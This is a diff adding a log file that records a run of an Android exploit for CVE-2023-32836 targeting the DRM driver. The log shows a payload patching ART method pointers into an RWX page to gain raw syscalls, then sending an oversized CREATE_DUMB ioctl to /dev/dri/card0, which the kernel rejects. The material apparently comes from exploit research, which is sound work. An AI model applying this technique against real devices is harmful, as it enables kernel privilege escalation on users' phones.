@@ -1,0 +1,32 @@
+a200fa67afc5c1996f0d84045c30f033  /data/data/com.android.settings/cache/trigger.dex
+[*] CVE-2023-32836 DRM exploit (Java/dalvikvm)
+[*] pid=24212 uid=1000 mode=trigger
+[*] === CVE-2023-32836 trigger ===
+
+[+] Scratch buffer at 0x7740208000
+[*] Trying anonymous PROT_RWX mmap...
+[+] Anonymous RWX page at 0x7740207000
+[+] Wrote syscall stubs: JNI@+0x00 (36B), Quick@+0x40 (36B)
+[*] ArtMethod for nativeSyscall at 0x74a37e5500
+    access_flags = 0x10000108 [NATIVE]
+    data (JNI ptr) = 0x74abe1a2c0
+    entry_point    = 0x1038000812c03be0
+[*] Patching data_ (JNI) → 0x7740207000
+[*] Patching entry_point (quick) → 0x7740207040
+    data_       = 0x7740207000 ✓
+    entry_point = 0x7740207040 ✓
+[+] ArtMethod patched
+[+] Syscall infrastructure ready
+
+[*] Self-test: pid=24212
+[*] Opening /dev/dri/card0...
+[*] openat ret=5
+[+] Opened /dev/dri/card0 fd=5
+[*] DRM_IOCTL_MODE_CREATE_DUMB
+    height=0x10001 width=0x4000 bpp=32
+[*] ioctl ret=-22 (EINVAL)
+[*] Result: handle=0 pitch=0x0 size=0x0
+
+[-] CREATE_DUMB rejected by kernel; no GEM handle to destroy.
+    EINVAL matches the MTK 64-bit-size path seen in IDA/runtime probe.
+TRIGGER_EXIT:0
